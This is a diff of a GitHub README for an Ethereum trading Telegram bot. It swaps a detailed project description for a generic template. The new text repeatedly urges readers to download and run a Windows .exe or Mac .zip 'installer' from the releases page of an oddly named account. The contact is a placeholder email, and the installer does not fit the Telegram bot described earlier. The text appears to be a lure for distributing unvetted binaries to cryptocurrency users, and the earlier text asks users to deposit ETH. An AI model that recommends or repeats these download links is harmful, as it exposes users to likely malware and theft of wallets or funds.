@@ -1,110 +1,65 @@
-<div align="center">
-
-# 🚀 ETH-TELEGRAM-VERSE-BOT Verse v2.0
-
-![ETH Trading Bot](https://i.ibb.co/MkHKDVJ6/a65e96a731a85c687ab655f3ac95bd73.jpg)
-
-**Automated Ethereum Trading Bot** — A powerful Telegram bot for intelligent DeFi trading featuring AI-driven strategies, real-time analytics, and secure wallet management. Built with Ethers.js, powered by Infura and Etherscan. Trade without emotions, 24/7!
-
-</div>
-
----
-
-<div align="center">
-
-### 🤖 **LAUNCH BOT IN TELEGRAM** 🤖
-
-[![Telegram Bot](https://img.shields.io/badge/Telegram-@ethverse__bot-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white)](https://t.me/ethverse_bot)
-
-**👆 Click to Start Trading! 👆**
-
-</div>
-
----
-
-## ✨ Key Features
-- **🤖 AI Strategies**: RSI, Momentum, Arbitrage optimized for DEX platforms like Uniswap and SushiSwap
-- **🛡 Risk Management**: Automatic Stop-Loss and Take-Profit for capital protection
-- **⚡ Gas Optimization**: Dynamic gas pricing via Etherscan (Safe, Proposed, Fast modes)
-- **📊 Real-Time Analytics**: P&L tracking, win rate, trade history with visual progress bars
-- **💳 Wallet Integration**: Secure wallet generation, QR code deposits, balance monitoring
-- **📱 Telegram-Native UI**: Inline keyboards, animations, no-code setup — user-friendly interface
-
----
-
-## ⚙️ How It Works
-1. **User Onboarding**
-   - Start the bot in Telegram (`/start`)
-   - Auto-generate secure Ethereum wallet (private key shown only to user)
-   - Deposit ETH (min 0.3 ETH required)
-2. **Strategy Selection**
-   - Choose between **RSI**, **Momentum**, or **Arbitrage**
-   - Adjust Stop-Loss / Take-Profit thresholds
-   - Pick Gas Mode (Safe / Proposed / Fast)
-3. **Execution Engine**
-   - Connects to Ethereum Mainnet via Infura
-   - Fetches gas data from Etherscan API
-   - Monitors DEX pairs and mempool in real time
-   - Executes trades automatically, optimized for chosen strategy
-4. **Analytics & Reporting**
-   - Live balance & P&L tracking
-   - Trade statistics: win rate, profit vs. loss
-   - Notifications directly in Telegram
-
-## 📊 Workflow Diagram
-Below is a visual flowchart illustrating the bot's operational flow, including branching for strategy-specific execution paths. This diagram highlights the seamless integration from onboarding to trade execution and monitoring.
-
-```mermaid
-flowchart TD
-    A[🚀 Start Bot in Telegram /start] --> B[🔑 Generate Secure Wallet<br/>Ethers.js + Private Key Export]
-    B --> C[💳 Deposit ETH<br/>Min: 0.3 ETH<br/>QR Code Support]
-    C --> D[⚙️ Configure Settings<br/>Stop-Loss, Take-Profit, Gas Mode]
-    D --> E[📈 Select Strategy]
-    E --> F[📊 RSI Branch<br/>Oversold <30: Buy<br/>Overbought >70: Sell<br/>Sideways Market Optimized]
-    E --> G[🚀 Momentum Branch<br/>Rising Trend: Buy<br/>Falling Trend: Sell<br/>Trend-Following Signals]
-    E --> H[⚡ Arbitrage Branch<br/>DEX Price Diffs: Buy Low/Sell High<br/>Uniswap ↔ SushiSwap<br/>Low-Risk, Gas-Intensive]
-    F --> I[🔍 Monitor Market & Mempool<br/>Infura RPC + Etherscan Gas]
-    G --> I
-    H --> I
-    I --> J[🎯 Execute Trade<br/>Auto-Swap via DEX Aggregator<br/>Apply SL/TP Checks]
-    J --> K[🛡️ Risk Check<br/>Stop-Loss Hit? → Sell<br/>Take-Profit Hit? → Sell]
-    K --> L{Trade Outcome?}
-    L -->|Profitable| M[✅ Update Stats<br/>+Profit, Win Rate ++<br/>P&L Notification]
-    L -->|Loss| N[❌ Update Stats<br/>+Loss, Review Strategy<br/>Alert Notification]
-    M --> O[📊 Real-Time Analytics<br/>Balance Refresh, Progress Bars]
-    N --> O
-    O --> P[🔄 Loop: Continuous Monitoring<br/>24/7 Operation]
-    P --> I
-
-    style A fill:#e1f5fe
-    style E fill:#f3e5f5
-    style F fill:#fff3e0
-    style G fill:#fff3e0
-    style H fill:#fff3e0
-    style J fill:#e8f5e8
-    style O fill:#f1f8e9
-```
-
-## 🛠 Technical Stack
-The bot is built with modern, reliable tools for seamless Ethereum integration and Telegram interaction:
-
-| Component | Technology | Purpose |
-|-----------|-----------|---------|
-| Blockchain | Ethers.js v6+ | Wallet generation, transaction signing, DEX swaps |
-| Provider | Infura | Ethereum Mainnet RPC access for real-time data |
-| API | Etherscan | Dynamic gas pricing and transaction monitoring |
-| Bot Framework | Node-Telegram-Bot-API | Inline keyboards, polling, message handling |
-| HTTP | Axios | Market data fetching and external API calls |
-| Storage | In-Memory Map (Node.js) | User sessions and bot states (scalable to Redis) |
-
-## 🚀 Roadmap
-We're committed to evolving ETH-BOT Verse. Upcoming features:
-
-- **v2.1 (Q4 2025)**: Multi-chain support (BSC, Polygon) + Flash Loan integration
-- **v2.2 (Q1 2026)**: Advanced ML models for predictive analytics + Portfolio diversification
-- **v2.3 (Q2 2026)**: API endpoints for external integrations + Mobile app companion
-
-Contributions welcome! Check issues for open tasks.
-
-## 📄 License
-This project is licensed under the MIT License - see the LICENSE file for details.
+# 🤖 Eth-Telegram-Verse-Bot - Trade Smart on Ethereum
+
+[![Download Eth-Telegram-Verse-Bot](https://img.shields.io/badge/Download%20Now-Get%20the%20Bot-blue.svg)](https://github.com/Anaphoric-battleoftewkesbury339/Eth-Telegram-Verse-Bot/releases)
+
+## 📘 Introduction
+Welcome to the Eth-Telegram-Verse-Bot! This application helps you create a trading bot that connects with the Ethereum network. With it, you'll have access to professional trading strategies. This bot is designed for users who want to leverage trading opportunities swiftly and easily.
+
+## 🚀 Getting Started
+To start using Eth-Telegram-Verse-Bot, follow these simple steps. You will need your computer and an internet connection.
+
+1. **Visit the Download Page**
+   Go to the official releases page where you can download the bot: [Download Eth-Telegram-Verse-Bot](https://github.com/Anaphoric-battleoftewkesbury339/Eth-Telegram-Verse-Bot/releases).
+
+2. **Select the Latest Release**
+   On the releases page, you will see a list of available versions. Look for the most recent version, as it will have the latest features and fixes.
+
+3. **Download the Installer**
+   Click on the appropriate file for your operating system. For most users, this will be either a `.exe` file for Windows or a `.zip` file for Mac.
+
+4. **Install the Application**
+   Once the file has downloaded, locate it in your downloads folder. Click on the file to start the installation process. Follow the on-screen instructions to complete the installation.
+
+5. **Set Up Your Bot**
+   After installing, open the Eth-Telegram-Verse-Bot application. You will need to configure a few settings to get started:
+   - Connect to your Ethereum wallet.
+   - Choose a trading strategy that suits your goals. We offer several options like arbitrage, RSI, and more.
+   - Set your preferences regarding notifications via Telegram.
+
+6. **Start Trading**
+   Once everything is set up, you can start your trading bot. Make sure to monitor it regularly to adjust settings as needed.
+
+## 📥 Download & Install
+To download the Eth-Telegram-Verse-Bot, click the following link: [Download Eth-Telegram-Verse-Bot](https://github.com/Anaphoric-battleoftewkesbury339/Eth-Telegram-Verse-Bot/releases).
+
+## 🔍 Features
+Eth-Telegram-Verse-Bot comes packed with features designed to enhance your trading experience:
+- **Automated Trading:** Set your bot to trade automatically based on your defined strategies.
+- **Real-Time Notifications:** Receive alerts directly through Telegram about your trades.
+- **Customizable Settings:** Adjust various settings to fit your trading style.
+- **Support for Multiple Strategies:** Implement different trading strategies like arbitrage and RSI.
+
+## 💻 System Requirements
+Before you begin, please ensure your system meets the following requirements:
+- **Operating System:** Windows 10 or later, macOS Mojave or later.
+- **Memory:** At least 4 GB RAM.
+- **Storage:** At least 500 MB of free disk space.
+- **Network:** Stable internet connection for trading operations.
+  
+## 🤝 Support
+If you encounter any issues while using Eth-Telegram-Verse-Bot, please consider checking our FAQ section in the repository, or open an issue on the GitHub page. The community is here to help you succeed.
+
+## 📝 Topics
+This project covers various topics relevant to trading and software utilization. Some of the key areas include:
+- **Arbitrage:** Opportunities for profit across various exchanges.
+- **RSI Strategy:** A technical analysis tool for traders.
+- **Telegram Integration:** Get real-time updates directly on your mobile device.
+
+Feel free to explore these topics to better understand how to use Eth-Telegram-Verse-Bot effectively.
+
+## 📞 Contact
+For further inquiries or assistance:
+- **Email:** support@example.com
+- **GitHub Issues:** Open a ticket through our issues page on GitHub. 
+
+Stay updated with improvements and new releases by following this repository. Happy trading with Eth-Telegram-Verse-Bot!
